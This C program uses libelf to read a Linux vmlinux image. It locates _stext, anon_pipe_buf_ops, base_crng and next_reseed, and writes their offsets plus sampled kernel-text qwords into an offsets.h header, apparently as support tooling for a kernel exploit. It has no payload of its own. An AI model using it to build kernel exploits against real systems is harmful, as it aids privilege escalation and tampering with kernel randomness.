#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <libelf.h>
#include <gelf.h>
#include <fcntl.h>
#include <unistd.h>

#define NUM_QWORDS 8
#define QWORD_STRIDE 0x200000

int main(int argc, char **argv) {
    if (argc < 2 || argc > 3) {
        fprintf(stderr, "Usage: %s /path/to/vmlinux [out.h]\n", argv[0]);
        return 1;
    }

    const char *vmlinux_path = argv[1];
    const char *out_path = (argc == 3) ? argv[2] : "inc/offsets.h";
    int fd = open(vmlinux_path, O_RDONLY);
    if (fd < 0) {
        perror("open vmlinux");
        return 1;
    }

    if (elf_version(EV_CURRENT) == EV_NONE) {
        fprintf(stderr, "ELF library initialization failed\n");
        return 1;
    }

    Elf *e = elf_begin(fd, ELF_C_READ, NULL);
    if (!e) {
        fprintf(stderr, "elf_begin failed\n");
        return 1;
    }

    size_t shstrndx;
    if (elf_getshdrstrndx(e, &shstrndx) != 0) {
        fprintf(stderr, "elf_getshdrstrndx failed\n");
        return 1;
    }

    Elf_Scn *scn = NULL;
    GElf_Shdr shdr;
    Elf_Data *data = NULL;

    uint64_t startup_64 = 0;
    uint64_t anon_pipe_buf_ops = 0;
    uint64_t base_crng = 0;
    uint64_t next_reseed = 0;  // New variable for next_reseed

    /* -------------------------
       Find required symbols
       ------------------------- */
    while ((scn = elf_nextscn(e, scn)) != NULL) {
        if (!gelf_getshdr(scn, &shdr))
            continue;

        if (shdr.sh_type != SHT_SYMTAB)
            continue;

        data = elf_getdata(scn, NULL);
        if (!data)
            continue;

        size_t count = shdr.sh_size / shdr.sh_entsize;
        for (size_t i = 0; i < count; i++) {
            GElf_Sym sym;
            if (!gelf_getsym(data, i, &sym))
                continue;

            char *name = elf_strptr(e, shdr.sh_link, sym.st_name);
            if (!name)
                continue;

            if (strcmp(name, "_stext") == 0) {
                startup_64 = sym.st_value;
            } else if (strcmp(name, "anon_pipe_buf_ops") == 0) {
                anon_pipe_buf_ops = sym.st_value;
            } else if (strcmp(name, "base_crng") == 0) {
                base_crng = sym.st_value;
            } else if (strcmp(name, "next_reseed") == 0) { // Add check for next_reseed
                printf("[+] Found next_reseed\n");
                next_reseed = sym.st_value;
            } else if (strcmp(name, "next_reseed.11") == 0) { // Add check for next_reseed.6
                printf("[+] Found next_reseed.11\n");
                next_reseed = sym.st_value;
            }
        }
    }

    if (!startup_64 || !anon_pipe_buf_ops || !base_crng || !next_reseed) {
        fprintf(stderr, "[-] Required symbols not found\n");
        return 1;
    }

    /* -------------------------
       Find section containing _stext
       ------------------------- */
    Elf_Scn *text_scn = NULL;
    GElf_Shdr text_shdr;
    Elf_Data *text_data = NULL;

    scn = NULL;
    while ((scn = elf_nextscn(e, scn)) != NULL) {
        if (!gelf_getshdr(scn, &text_shdr))
            continue;

        if (startup_64 >= text_shdr.sh_addr &&
                startup_64 < text_shdr.sh_addr + text_shdr.sh_size) {

            text_scn = scn;
            text_data = elf_getdata(scn, NULL);
            break;
        }
    }

    if (!text_scn || !text_data) {
        fprintf(stderr, "[-] Could not locate section for _stext\n");
        return 1;
    }

    /* -------------------------
       Generate offsets.h
       ------------------------- */
    FILE *out = fopen(out_path, "w");
    if (!out) {
        perror(out_path);
        return 1;
    }

    fprintf(out, "#ifndef _OFFSETS_H_\n#define _OFFSETS_H_\n\n");

    fprintf(out, "/* Symbol offsets */\n");
    uint64_t anon_pipe_buf_ops_offset = anon_pipe_buf_ops - startup_64;
    uint64_t base_crng_offset = base_crng - startup_64;
    uint64_t next_reseed_offset = next_reseed - startup_64;  // Offset for next_reseed

    fprintf(out, "#define ANON_PIPE_BUF_OPS_OFFSET    0x%lx\n",
            anon_pipe_buf_ops_offset);
    fprintf(out, "#define BASE_CRNG_OFFSET            0x%lx\n",
            base_crng_offset);
    fprintf(out, "#define PENDING_BIT_OFFSET          0x%lx\n\n",  // Print offset for next_reseed
            next_reseed_offset);

    fprintf(out, "/* QWORDs */\n");

    for (int i = 0; i < NUM_QWORDS; i++) {

        uint64_t vaddr = startup_64 + (i * QWORD_STRIDE);

        if (vaddr < text_shdr.sh_addr ||
                vaddr + sizeof(uint64_t) >
                text_shdr.sh_addr + text_shdr.sh_size) {

            fprintf(stderr, "QWORD%d out of range\n", i);
            continue;
        }

        uint64_t offset = vaddr - text_shdr.sh_addr;
        uint64_t val;

        memcpy(&val,
                (uint8_t *)text_data->d_buf + offset,
                sizeof(uint64_t));

        fprintf(out,
                "#define QWORD%d  0x%016lxUL  /* _stext + 0x%x */\n",
                i, val, i * QWORD_STRIDE);
    } 

    fprintf(out, "\n#endif /* _OFFSETS_H_ */\n");
    fclose(out);

    printf("[+] Generated inc/offsets.h\n");

    elf_end(e);
    close(fd);
    return 0;
}

